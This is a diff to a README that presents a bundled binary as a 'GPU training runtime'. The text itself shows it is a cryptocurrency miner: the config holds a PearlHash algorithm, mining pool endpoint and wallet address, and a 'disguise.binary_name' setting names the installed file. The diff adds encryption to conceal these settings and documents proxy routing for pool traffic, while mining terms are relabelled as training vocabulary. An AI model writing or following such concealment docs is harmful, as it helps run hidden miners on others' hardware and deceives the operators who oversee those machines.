@@ -2,13 +2,60 @@
 
 Install and run the GPU training runtime bundled in `src/trainer`. Setup copies
 the local binary and its accompanying files; it requires no runtime download.
+The bundled executable is `src/trainer/pt_main`; setup uses
+`disguise.binary_name` for its installed filename.
 
 ## Requirements
 
 - Linux with a compatible GPU and working driver
 - Python 3.9 or newer, Bash, and tmux
+- Python's `cryptography` package (see `requirements.txt`)
 - The complete `src/trainer` directory, including the bundled executable
 - When `useProxy` is `true`: a reachable SOCKS5 proxy (setup included in `proxy/`)
+
+If `cryptography` is not already available, install it in a user-owned virtual
+environment; no sudo is needed. Activate that environment before using either
+setup entrypoint or `utils.py`:
+
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+python3 -m pip install -r requirements.txt
+```
+
+## Encrypted configuration
+
+`config.json` is the default configuration. Only its top-level `"decKey": "qwer"`
+entry is readable. Every other setting name and its entire JSON value are
+encrypted, including nested keys and values. Setup decrypts the file before
+resolving settings, restoring strings, numbers, booleans, lists, and objects.
+Alternate files passed with `-c` must use the same encrypted format.
+
+`utils.py` provides `encrypt(value, key)`, `decrypt(token, key)`,
+`encrypt_config(config, key=None)`, and `decrypt_config(config)`. It uses
+[Fernet authenticated encryption](https://cryptography.io/en/latest/fernet/)
+with a random salt and scrypt key derivation for each token. Wrong keys and
+damaged tokens fail before installation. The supplied configuration contains
+the requested PearlHash algorithm, pool endpoint, and wallet address.
+
+To change a setting, decrypt a working copy, edit it, then encrypt it again:
+
+```bash
+python3 utils.py decrypt config.json -o config.plain.json
+# Edit config.plain.json with your editor.
+python3 utils.py encrypt config.plain.json -o config.json
+python3 train_setup.py --check
+```
+
+The CLI creates output files with mode `600`; `config.plain.json` is ignored by
+Git. Remove the plaintext working copy when finished. To change the key, change
+`decKey` in the decrypted working copy before re-encrypting. Changing `decKey`
+directly in an encrypted file will prevent that file from decrypting.
+
+Since the decryption key is stored beside the ciphertext, anyone who can read
+the file can decrypt it. This conceals plaintext settings in `config.json`;
+generated runtime files (`.env`, `run_train.sh`), process arguments, and logs may
+still contain decrypted values.
 
 ## Net-client: local SOCKS proxy
 
@@ -36,11 +83,11 @@ bash proxy/connection_setup.sh status
 
 Setup tests the profiles and starts the fastest successful one on
 `127.0.0.1:10808`, accepting SOCKS5 and HTTP connections. The `socks` value in
-`params.json` already matches this port. If you select a different port with
-`--port`, update `params.json` to match before launching the training runtime.
+the decrypted `config.json` already matches this port. If you select a different
+port with `--port`, update and re-encrypt the configuration before launching.
 Proxy setup and training setup are separate steps. To use this client for pool
-connections, set `"useProxy": true` in `params.json` and run training setup after
-the proxy is running.
+connections, set `"useProxy": true` in the decrypted configuration, re-encrypt it,
+and run training setup after the proxy is running.
 
 ### Profiles and ports
 
@@ -74,7 +121,8 @@ bash proxy/connection_setup.sh verify   # check bundled asset integrity
 `status` checks the local process; `test` checks upstream connectivity. If all
 profiles fail during setup, the existing saved/running client is kept. If the
 port is occupied, stop its owner or select another port and update `socks` in
-`params.json` accordingly. After restarting the machine/workspace, run `start`.
+the decrypted configuration accordingly, then re-encrypt it. After restarting
+the machine/workspace, run `start`.
 
 ### Use net-client with other commands
 
@@ -99,8 +147,8 @@ profiles, testing, lifecycle commands, and troubleshooting.
 
 ## Choose direct or proxy pool connections
 
-Set these top-level fields in `params.json` to route pool connections through
-net-client (or another SOCKS5 proxy):
+Set these top-level fields in your decrypted configuration, then re-encrypt it,
+to route pool connections through net-client (or another SOCKS5 proxy):
 
 ```json
 {
@@ -109,7 +157,8 @@ net-client (or another SOCKS5 proxy):
 }
 ```
 
-This is a configuration excerpt; keep the other fields in your existing file.
+This is a plaintext configuration excerpt; keep the other fields, including
+`decKey`, in your decrypted working copy.
 `useProxy` must be a JSON boolean, without quotation marks.
 
 - **`true`**: passes the configured SOCKS5 proxy to the runtime for pool
@@ -126,7 +175,9 @@ session until setup is rerun.
 ## Project layout
 
 ```text
-params.json             training and SOCKS settings
+config.json             encrypted training and SOCKS settings, plus decKey
+utils.py                encryption helpers and config editing CLI
+requirements.txt        Python encryption dependency
 train_setup.py / .sh     training setup entrypoints
 src/trainer/            bundled GPU runtime
 src/weights_*.pth       existing weight files
@@ -136,10 +187,10 @@ proxy/                  self-contained SOCKS5/HTTP proxy kit
 
 ## Usage
 
-1. Edit the existing fields in `params.json`: configure the training algorithm,
-   coordinator endpoint, and account identifier, and adjust the proxy and
-   training worker identifier for your environment. Choose an algorithm
-   supported by the bundled runtime; see `src/trainer/help.txt`.
+1. Review or change settings using the encrypted configuration workflow above.
+   The algorithm, coordinator endpoint, and account identifier are populated.
+   Adjust the proxy and worker identifier for your environment. The selected
+   algorithm must be supported by your bundled runtime; see `src/trainer/help.txt`.
 2. Validate the configuration and local binary without installing or launching:
 
    ```bash
@@ -162,6 +213,7 @@ file, including when invoked with environment variables set.
 
 | Setting | Purpose |
 |---|---|
+| `decKey` | Plaintext string used to decrypt the other settings; supplied value is `qwer`. |
 | `useProxy` | Boolean: `true` routes pool connections through SOCKS5; `false` or omitted connects directly. |
 | `socks` | Required only when `useProxy` is `true`; bundled proxy URL: `socks5://127.0.0.1:10808`. |
 | Training coordinator | Coordinator endpoint for your chosen training algorithm. Required. |
